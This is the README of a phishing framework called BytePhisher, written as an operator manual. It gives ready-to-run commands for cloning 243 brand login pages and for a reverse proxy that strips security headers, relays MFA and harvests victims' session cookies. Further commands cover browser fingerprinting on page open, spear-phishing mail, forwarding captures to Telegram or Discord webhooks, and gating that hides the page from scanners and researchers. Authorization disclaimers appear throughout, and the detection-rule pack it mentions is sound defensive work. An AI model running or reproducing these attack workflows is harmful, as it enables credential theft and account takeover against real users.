# BytePhisher 0.1.0

**Advanced phishing-simulation framework** for authorized security-awareness
engagements, red-team exercises and CTF/lab work.

Pure-Python engine (no PHP), 243 brand templates, 6 concurrent tunnels,
SQLite capture store, live TUI + web dashboard, 2FA/OTP flow, campaign tagging
with A/B template rotation, bot/scanner risk scoring, QR codes, SMTP
spear-phishing module, CSV/JSON export, a **deep device dump on page open**
(190+ browser capabilities, fonts, GPU, WebRTC, permissions, automation
evidence) — and a
**reverse-proxy engine** that mirrors a real live site with a capture hook
injected, so the victim's session is genuine (Evilginx-class, pure Python).

> Authorized use only. Run it against systems you own or are contracted to
> test — a client engagement, an awareness campaign with written sign-off, or
> your own lab. The tool prints a demonstration banner on every rendered page.

---

## Two engines in one tool

| mode | how it works | when to use it |
|---|---|---|
| **static** (`-o google`) | serves a generated brand page from `templates/` | awareness campaigns, quick lab demos, anything where a copied page is enough |
| **reverse proxy** (`--proxy --upstream site.com`) | serves the **real site** through your link with a capture hook injected; the login really completes upstream | red-team engagements where a static copy would be spotted instantly |

Proxy mode is documented end-to-end in [`docs/PROXY.md`](docs/PROXY.md) —
including the honest list of what breaks (WebSockets, HTTP/2-only endpoints,
strict CSP-reporting sites) and why MFA is relayed rather than bypassed.

## Why it goes beyond PyPhisher / ZPhisher / BlackEye

| Capability | PyPhisher | BlackEye | ZPhisher | **BytePhisher** |
|---|---|---|---|---|
| Server stack | PHP required | PHP required | PHP required | **pure Python (no PHP)** |
| Templates | 77 | 33 | 30+ | **243 built-in + import any real login page** |
| Reverse proxy (real site + hook) | ✗ | ✗ | ✗ | **✓ per-victim cookie jar, HTML rewrite, MFA relay** |
| Deep device dump on page open | ✗ | ✗ | ✗ | **✓ 26 modules: client hints, fonts, GPU, WebRTC, permissions, 190+ API checks, device token** |
| Tunnels | 4 (concurrent) | LAN / 1 | 1 | **6 concurrent (cloudflared, ngrok, localhost.run, serveo, bore, hoplink)** |
| Capture store | text file | text file | text file | **SQLite (WAL) + CSV/JSON export** |
| Campaigns | ✗ | ✗ | ✗ | **✓ tagging, per-campaign stats, A/B template rotation** |
| Campaign gating (geo/ASN/hours/cap) | ✗ | ✗ | ✗ | **✓ fail-closed allow-lists, logged refusals** |
| Bot/scanner triage | ✗ | ✗ | ✗ | **✓ 0-100 risk score with reasons, per-row risk in exports** |
| Detection pack for the blue team | ✗ | ✗ | ✗ | **✓ Sigma / Suricata / YARA / EDR rules (`docs/DETECTION.md`)** |
| Real client IP behind tunnel | ✗ | partial | ✗ | **✓ CF-Connecting-IP / XFF / X-Real-IP** |
| Geo + ISP + datacenter enrichment | partial | ✓ | ✗ | **✓ (ipapi / ipinfo, off switch)** |
| Device / OS classification | ✓ | ✓ | ✗ | **✓ iOS/Android/Win/macOS/Linux** |
| Honeypot anti-autofill field | ✗ | ✗ | ✗ | **✓** |
| Form-open timing beacon (bot detection) | ✗ | ✗ | ✗ | **✓** |
| OTP / 2FA page flow | ✓ | ✗ | ✗ | **✓ (login → creds → OTP → redirect)** |
| Live dashboard | ✗ | ✗ | ✗ | **✓ rich TUI + Flask dashboard w/ SSE stream** |
| Spear-phishing email module | ✓ | ✓ | ✗ | **✓ SMTP + 4 templates + variable substitution** |
| Redirect after capture | ✓ | ✓ | ✓ | **✓ (or built-in thank-you page)** |
| TLS/HTTPS serving | ✗ | ✗ | ✗ | **✓ (--tls --cert)** |
| URL shadowing / social preview | ✓ | ✗ | ✗ | **✓ (OG meta tags baked into every template)** |
| Cross-platform | Linux/mac | Linux/mac | Linux | **Linux / macOS / Windows / Termux** |

---

## Install

```bash
# 1) as a Python package (console script `bytephisher` on your PATH)
pip install .            # or: pip install -e .  for a live source checkout
bytephisher --version

# 2) from a source checkout (what the tests use)
git clone <repo> bytephisher && cd bytephisher
python3 -m venv .venv && ./.venv/bin/pip install -r requirements.txt
./.venv/bin/python tools/gen_templates.py     # writes templates/ (243 sites)
```

Optional extras: `pip install ".[test]"` (pytest suite), `pip install ".[dev]"` (tests + ruff).

`BYTEPHISHER_HOME` decides where `config/`, `templates/` and `data/` live
(defaults to the checkout; an installed copy falls back to the current
directory, so it never tries to write into site-packages).

Requirements: Python 3.10+ (`rich`, `jinja2`, `requests`, `pyyaml`, `flask`,
`segno`). No PHP, no web server, no external binaries except the tunnel client
you pick (cloudflared is auto-downloaded into `bin/` when missing).

## Quick start

```bash
# list the templates
./.venv/bin/python bytephisher.py --list

# local-only dry run (no tunnel), Google template on :8080
./.venv/bin/python bytephisher.py -o google -m test

# full run: Instagram over cloudflared, geo lookup on, 2FA page, then redirect
./.venv/bin/python bytephisher.py -o instagram -t cloudflared --otp \
    -u https://example.com/after --geo ipapi

# campaign with tagging, A/B rotation, QR, Telegram alerts and the dashboard
./.venv/bin/python bytephisher.py -o google --rotate google,instagram \
    --campaign q3-payroll --qr data/qr.png \
    --telegram "123456:AA...:987654321" --web-dashboard

# every tunneler at once
./.venv/bin/python bytephisher.py -o netflix -t all

# reverse-proxy mode: mirror a real site and inject the capture hook
./.venv/bin/python bytephisher.py --proxy --upstream sso.example.com \
    --login-path /login -t cloudflared --campaign q3-sso
# or with a phishlet file (recommended for real engagements)
./.venv/bin/python bytephisher.py --proxy --phishlet config/phishlets/example.yaml

# pull the data out
./.venv/bin/python bytephisher.py --export data/captures.csv
./.venv/bin/python bytephisher.py --export data/captures.json --campaign q3-payroll
./.venv/bin/python bytephisher.py --reuse
```

### Flags

| Flag | Meaning |
|---|---|
| `-o, --option` | template index `1..243` or slug (`google`, `instagram`, …) |
| `-t, --tunneler` | `cloudflared` \| `ngrok` \| `localhost_run` \| `serveo` \| `bore` \| `hoplink` \| `all` \| `none` |
| `--proxy` | reverse-proxy mode: serve the real site with the hook injected |
| `--phishlet YAML` | target definition for `--proxy` (see `config/phishlets/example.yaml`) |
| `--upstream HOST[:PORT]` | inline target for `--proxy` (no YAML needed) |
| `--proxy-scheme http\|https` | scheme used to reach the upstream (default `https`) |
| `--login-path PATH` | login path on the upstream |
| `--capture-cookies LIST` | cookies to harvest (`*` = all) |
| `--inject-paths REGEXES` / `--block-paths REGEXES` | where the hook is / isn't injected |
| `--no-verify-tls` | skip upstream certificate verification (lab only) |
| `--no-intel` | disable the deep device dump collected on page open |
| `--intel-perms` | also fire permission-gated probes on the first gesture |
| `--intel-dump SID\|ID\|latest` | print the full device dump for a visitor and exit |
| `--intel-list` | list collected devices (token, bot score, VPN score) and exit |
| `--intel-export PATH` | write every device dump to JSON and exit |
| `-u, --url` | redirect URL after capture |
| `-p, --port` | local port (default 8080) |
| `-m, --mode` | `normal` (tunnels) or `test` (local only) |
| `--otp` | serve the 6-digit OTP page after credential submit |
| `--tls --cert` | serve HTTPS from a PEM cert (+ key at the same path with `key` in the name) |
| `--geo` | `ipapi` \| `ipinfo` \| `off` |
| `--web-dashboard` / `--web-port` | Flask dashboard + JSON API |
| `--telegram TOKEN:CHAT_ID` | send every capture to a Telegram chat |
| `--webhook URL` | POST every capture as JSON (Discord / Slack / n8n / Mattermost) |
| `--mailto a@x.com[,b@y.com]` | after tunnels are up, email the live link via SMTP |
| `--mail-template` | `password_reset` \| `security_alert` \| `shared_doc` \| `invoice` |
| `--campaign NAME` | tag captures with a campaign (default: template slug) |
| `--rotate a,b,c` | serve a random one of these templates per request (A/B) |
| `--allow-country CC` / `--block-country CC` | gate by country code |
| `--block-datacenter` | refuse hosting/cloud ASNs |
| `--active-hours 9-18` / `--active-days mon-fri` | gate by local time window |
| `--max-hits N` | refuse an IP after N hits per hour |
| `--decoy URL` | where gated-out visitors are sent (default: inert 503) |
| `--tunnel-restart` | auto-restart a tunneler that dies mid-campaign (max 5 each) |
| `--qr [PATH]` | save a QR code PNG of the live link (default `data/qr.png`) |
| `--reuse` | print credential-reuse findings (repeated identities / passwords) and exit |
| `--check-update` / `--update-repo OWNER/REPO` | check for a newer release |
| `--export PATH` | dump captures (`.json` → JSON, anything else → CSV) and exit |
| `--no-tui` | plain refresh output instead of the full-screen dashboard |

---

## Reverse-proxy mode (real site, live session)

Instead of a copied page, the proxy serves the **real target** through your
link. The hook injects into the pages you choose, the victim's login completes
upstream, and the capture records the credential, the upstream session cookies
and a device fingerprint.

```bash
# inline
./.venv/bin/python bytephisher.py --proxy --upstream sso.example.com \
    --login-path /login --capture-cookies '*' --inject-paths '^/login,^/mfa' \
    -t cloudflared --campaign q3-sso

# phishlet file (copy the example, edit it)
cp config/phishlets/example.yaml config/phishlets/sso.yaml
./.venv/bin/python bytephisher.py --proxy --phishlet config/phishlets/sso.yaml -t cloudflared
```

What the engine does per response: drops `Content-Security-Policy`, `HSTS` and
`X-Frame-Options`; strips SRI `integrity`/`crossorigin`; neutralises
`Set-Cookie` scoping; rewrites absolute upstream URLs and `Location` redirects
back to your host; injects the hook; and keeps a **per-victim upstream cookie
jar** so two victims never share a session. Verified live in this build against
a real public HTTPS site: page rewritten, form POST relayed to the upstream and
echoed back, capture stored with campaign/credential/risk flags.

Full reference, including the honest limits (WebSockets, HTTP/2-only endpoints,
strict CSP-reporting sites, why MFA is relayed not bypassed):
[`docs/PROXY.md`](docs/PROXY.md).

---

## Deep device dump (everything the browser gives away)

The moment the link opens — before anything is typed — the page reports what the
device is willing to tell any site on the internet: client hints (CPU arch,
bitness, browser build), screen and multi-monitor layout, timezone/locale with
DST behaviour, canvas + audio + WebGL/WebGPU fingerprints, installed fonts,
battery, network quality, media devices, DRM/codec support, the full permissions
matrix, a 190+ entry API capability matrix, extension and password-manager
artefacts, WebRTC local/public IPs (VPN inference) and live behaviour counters.

```bash
# full dump for one visitor (id, session id or 'latest')
./.venv/bin/python bytephisher.py --intel-dump latest

# who has been collected, with device tokens and bot/VPN flags
./.venv/bin/python bytephisher.py --intel-list

# machine-readable export of every device
./.venv/bin/python bytephisher.py --intel-export data/devices.json
```

What the analysis derives from the raw modules:

| conclusion | derived from |
|---|---|
| **device token** (stable, cookie-independent) | canvas + audio + GPU + CPU + fonts + screen + timezone |
| **headless/bot score 0-100** + the evidence | WebDriver flag, driver globals, software GPU (SwiftShader), empty plugin arrays, impossible permission states, default virtual resolutions |
| **VPN/proxy suspicion** + reasons | WebRTC public IP vs the HTTP source IP, relay-only ICE, timezone/language vs IP country |
| **browser / OS / device class** | UA + client hints + feature flags (survives UA spoofing better than UA alone) |
| **installed software hints** | font list, DRM modules, codecs, password-manager DOM markers, extension scripts |

`--intel-perms` additionally fires the permission-gated probes on the first user
gesture (geolocation, clipboard, notifications, USB/serial/HID) — those cost a
browser prompt, so they are off by default. `--no-intel` disables the collector
entirely. Dumps ride the same store, the same export and the same alerts as
credential captures.

---

## Capture alerts (real-time)

```bash
# Telegram: every capture pings your chat
./.venv/bin/python bytephisher.py -o google -t cloudflared --telegram "123456:AA...:987654321"

# Discord/Slack/n8n webhook instead (or both at once)
./.venv/bin/python bytephisher.py -o google --webhook https://discord.com/api/webhooks/...
```

Alerts fire on a daemon thread and are wrapped in try/except, so a dead webhook
can never slow down or break the capture path. Same values can live in
`config/config.yaml` (`telegram`, `webhook`).

## Email open-tracking

Every HTML mail built by `mailer.to_html(body, base=<public url>)` embeds a 1x1
`/px.gif` pixel served by BytePhisher itself; loading the mail counts a visit,
so opens are visible in the dashboard even when nobody submits the form.

## Tunnel reality check

`tools/probe_tunnels.py` starts a real server, brings up each tunneler, fetches
the public URL over the internet and reports the truth. Latest run from this
build (honest, not aspirational):

| Tunneler | Public page served | Notes |
|---|---|---|
| `cloudflared` | YES | auto-downloads the binary if missing; waits for edge registration so the first hit isn't a 530 |
| `localhost_run` | YES | needs `ssh`; no account |
| `bore` | YES | auto-downloads the musl binary from GitHub releases; `http://bore.pub:<port>` (no TLS) |
| `ngrok` | NO (untested) | binary not installed here and free ngrok now requires an authtoken |
| `serveo` | NO | service has been sunset/unreliable for years; adapter fails soft |
| `hoplink` | NO | service not answering; adapter fails soft |

A dead tunneler returns `None` and the rest keep working — `-t all` brings up
everything it can and prints which links are live. During a run the CLI also
watches the tunnel processes: if one exits (quick tunnels do drop their edge
connection), you get a loud warning naming it rather than a silently dead link —
and with `--tunnel-restart` the CLI brings it back automatically (up to 5
attempts per tunneler) and prints the new public URL.

## Campaign gating (who even sees the page)

Scanners, researchers and VPN traffic pollute campaigns. Gate them out — every
refusal is logged with its reason, so you can state the real ratio
("412 visits, 37 served, 375 gated out") straight from the `blocked` table:

```bash
# only Indian visitors, never hosting/datacenter ASNs, Mon-Fri 9-18, max 5 hits/IP/h
./.venv/bin/python bytephisher.py -o google -t cloudflared --geo ipapi \
    --allow-country IN --block-datacenter --active-days mon-fri --active-hours 9-18 \
    --max-hits 5 --decoy https://real-company.example/login
```

| Flag | Effect |
|---|---|
| `--allow-country CC[,CC]` | serve only these ISO country codes |
| `--block-country CC[,CC]` | never serve these |
| `--block-datacenter` | refuse hosting/cloud ASNs (kills most automated scanning) |
| `--active-days mon-fri` / `--active-hours 9-18` | campaign only exists in that window |
| `--max-hits N` | refuse an IP after N hits per hour (default 3600 s window) |
| `--decoy URL` | where gated-out visitors go (default: an inert `503 Service unavailable` page) |

Failure semantics are deliberate: an **allow list** fails closed (no geo data →
refused, since nothing proves the visitor is allowed), the **datacenter filter**
fails open (no ISP data → served, so a geo outage never takes the campaign
dark). The CLI warns when country/datacenter gating is combined with `--geo off`.
Gated-out visitors are not counted as visitors, so `visitors` stays meaningful.

## Risk scoring (bot / scanner triage)

Every submission is scored 0–100 with human-readable reasons — nothing is
silently dropped, so campaign numbers stay defensible:

| Signal | Weight |
|---|---|
| automation user-agent (`curl`, `python-requests`, headless, scanners) or missing UA | +40 |
| datacenter / hosting ISP (OVH, AWS, Hetzner, DigitalOcean, …) | +35 |
| honeypot field filled (blind autofill) | +40 |
| submit faster than 0.8 s (1.5 s partially) | +30 / +15 |
| unrecognised device / no geo | +10 / +5 |

`low` < 30 ≤ `medium` < 70 ≤ `high`. The dashboard shows the level per row,
CSV/JSON exports carry `risk` + `risk_reasons` on every capture, and alerts
include the score — so a bot hit is never presented as a human credential.

## Campaigns and A/B rotation

```bash
# one database, several campaigns
./.venv/bin/python bytephisher.py -o google   --campaign q3-payroll -t cloudflared
./.venv/bin/python bytephisher.py -o netflix  --campaign q4-invoice -t cloudflared

# A/B: each visitor gets one of these templates, captures keep the campaign tag
./.venv/bin/python bytephisher.py -o google --rotate google,instagram,netflix \
    --campaign q4-ab-test

curl -s 'localhost:8090/api/stats?campaign=q4-ab-test'
./.venv/bin/python bytephisher.py --export data/q4.csv --campaign q4-ab-test
```

## QR codes for the live link

```bash
./.venv/bin/python bytephisher.py --qr data/qr.png               # during a live run
./.venv/bin/python bytephisher.py -o google --qr poster.png -t cloudflared
```

PNG (print/WhatsApp), SVG and terminal renderings are all available from
`core/links.py`. The QR encodes whatever public URL the tunneler reported, so
generate it after the tunnel is up.

## Load testing your own instance

```bash
./.venv/bin/python tools/stress.py --port 8080 --concurrency 25 --total 1000 --mix --db data/bytephisher.db
```

Prints throughput, p50/p95/p99 latency, HTTP error counts and — with `--db` —
the row count actually written, so a "successful" run cannot hide lost captures.

## Deployment

| Target | How |
|---|---|
| Docker | `docker compose up -d` (see `docker-compose.yml`, dashboard on :8090) |
| systemd | `cp deploy/bytephisher.service /etc/systemd/system/ && systemctl enable --now bytephisher` |
| Android/Termux | `bash deploy/install-termux.sh` (auto-downloads cloudflared arm64 on first use) |
| Anywhere | `make install && make run` |

## Documentation

* `README.md` — this file: capabilities, flags, verification evidence
* `docs/ARCHITECTURE.md` — module map, data flow, design rules
* `docs/PROXY.md` — reverse-proxy engine: phishlet reference, limits, ops notes
* `docs/INTEL.md` — deep device dump: every module, what it proves, limits
* `docs/DETECTION.md` — purple-team pack: Sigma / Suricata / YARA / EDR rules
* `docs/FEATURE_MATRIX.md` — **planned vs built**, with the honest gaps
* `docs/USAGE.md` — operator walkthrough, campaign by campaign
* `docs/TESTING.md` — test tiers, what is really verified, how to debug failures
* `tests/README.md` — the eight suites and the rules they follow
* `CHANGELOG.md` — what changed and which bug each fix came from

### Before every campaign

```bash
./.venv/bin/python bytephisher.py --doctor      # deps, templates, DB, tunnelers
./.venv/bin/python tools/probe_tunnels.py       # which tunnelers work right now
```

## Architecture

```
bytephisher.py          CLI: arg parsing → template pick → server/proxy → tunnels → dashboard
core/
  server.py             threaded HTTP server, TLS, forwarded-IP resolution,
                        geo/device enrichment, honeypot + OTP flow, rotation
  proxy.py              reverse-proxy engine: phishlet, per-victim cookie jar,
                        HTML/header rewriting, hook injection, capture endpoint
  capture.py            SQLite store (captures + visitors + campaign + risk),
                        thread-safe, in-place migrations, CSV/JSON export
  templates.py          Jinja2 rendering, OTP/thank-you pages
  gate.py               campaign gating: country, datacenter ASN, hours, hit cap
  risk.py               0-100 bot/scanner scoring with human-readable reasons
  alerts.py             Telegram + generic webhook notifications
  links.py              QR code generation (PNG/SVG/terminal)
  intel.py              deep device intelligence: merge waves, derive device
                        token / bot score / VPN suspicion, render the CLI dump
  net.py                outbound transport, IPv4-first (no IPv6 route = no crash)
  update.py             release check with 24h cache + background notice
tunnels/__init__.py     6 tunneler adapters, auto-download, URL scraping from logs,
                        process tracking + clean shutdown + watchdog helpers
dashboard/__init__.py   rich TUI (live_loop), Flask web dashboard + SSE stream
mailer/__init__.py      SMTP spear-phishing (4 templates, HTML, tracking pixel)
tools/gen_templates.py  243-site template generator (add a site = one tuple)
tools/import_site.py    import any real login page as a template
tools/probe_tunnels.py  probe all six tunnelers against the real internet
tools/stress.py         load test your own instance (latency + DB integrity)
tools/doctor.py         environment self-check
tools/campaign.sh       one-shot campaign launcher
assets/intel.js         browser-side collector (26 modules, 3 waves)
deploy/                 systemd unit, Termux installer
templates/              generated sites: index.html, otp.html, fields.json
config/config.yaml      defaults (port, db, geo provider, smtp, alerts)
config/phishlets/       reverse-proxy target definitions (YAML)
tests/                  9 suites (unit/integration/live) + run_all.py runner
```

### Request lifecycle

1. `GET /…` → visitor counted → `index.html` rendered for the site folder.
   (`/otp` serves the OTP page when `--otp` is on.)
2. `POST /…` → body parsed (urlencoded **and** multipart) → every field stored
   to SQLite with IP, city, country, ISP, UA, device class, credential flag.
3. Response: OTP page (if `--otp` and this was a credential submit) → else
   `302` to `-u` redirect → else the built-in thank-you page.
4. Live dashboard reads the DB on every refresh, so hits appear immediately.

## Anti-bot details

- **Honeypot input** (`hp_email`, visually hidden) — naive bots/autofillers that
  fill every field are recorded with the honeypot value set.
- **Timing beacon** — a hidden `_ts` field records how long the form was open;
  sub-100 ms submissions are automated, not human.
- **Device/OS class** and **datacenter/ISP** fields let you separate real
  targets from scanners and researchers during a campaign.

## Operational notes

- Client IP behind a tunnel comes from `CF-Connecting-IP` → `True-Client-IP` →
  `X-Real-IP` → first hop of `X-Forwarded-For` → socket address, in that order.
- SQLite runs in WAL mode with a write lock, so the threaded server never
  corrupts the store under concurrent submissions.
- `--geo off` disables all outbound lookups for air-gapped lab use.
- Every template carries a visible demonstration footer; keep it for awareness
  campaigns and remove it only where your engagement brief allows.

## Docker

```bash
docker build -t bytephisher .
docker run --rm -p 8080:8080 -p 8090:8090 -v "$PWD/data:/app/data" bytephisher \
    -o google -t cloudflared --web-dashboard --web-port 8090 --no-tui
```

## Tests

```bash
./.venv/bin/python tests/run_all.py          # full suite, honest summary
./.venv/bin/python tests/run_all.py --fast   # skip the live/internet suite
```

| Suite | What it proves |
|---|---|
| `tests/test_e2e.py` | standalone end-to-end: real HTTP server, real POST, real SQLite rows |
| `tests/test_units.py` | body parsing (urlencoded/multipart/JSON/unicode), credential detection, device classification, capture DB (+concurrency, dedupe, migrations, CSV/JSON), all generated templates (243), mailer rendering, alerts, tunneler URL patterns, CLI helpers, custom-site import |
| `tests/test_http.py` | live HTTP behaviour: GET/POST variants, honeypot, timing field, forwarded-IP resolution, device detection over the wire, redirect mode, OTP flow, TLS, webhook firing end-to-end, 40 parallel submissions |
| `tests/test_features.py` | risk engine + risk over HTTP, QR output, template rotation, alert payloads, CLI flags, JSON/CSV export, stress tool integrity, doctor, campaign launcher |
| `tests/test_gate.py` | gating parsers, gate logic (country/datacenter/hours/days/hit-cap), gating over real HTTP incl. decoy redirect and "refused visitors are not counted" |
| `tests/test_gaps.py` | packaging/pip install, SSE dashboard stream, update check, credential reuse, migrations, tunnel watchdog |
| `tests/test_intel.py` | deep device dump: identity/device-class guessing, headless + VPN scoring with evidence, device-token stability, wave merging (and stale-error cleanup), page tag injection, collector serving, malformed/empty/oversized payloads, one-record-per-session, export, and the `--intel-dump/list/export` CLI |
| `tests/test_proxy.py` | reverse-proxy engine against a fake multi-step login site: rewriting, hook injection, cookie isolation, capture storage, risk, malformed/empty bodies, upstream 500/down, inject/block rules, unicode + 50 KB fields, 12-way concurrency, HEAD, query strings, phishlet YAML — plus three CLI-level `--proxy` runs with an isolated `BYTEPHISHER_HOME` |
| `tests/test_live.py` | real internet: geo lookup, cloudflared/localhost.run/bore tunnels with a public POST landing in SQLite, Flask dashboard API, real SMTP delivery via a local aiosmtpd sink, public webhook echo, CLI subprocess runs with SIGINT summary, TUI live loop |

Live tests skip (with a reason) when an external service is unavailable — they
never fake a pass.

## Legal

Phishing infrastructure is a dual-use capability. Use it only where you have
explicit written authorization (client pentest scope, awareness campaign
sign-off, CTF rules, or your own infrastructure). You are responsible for how
you deploy it.
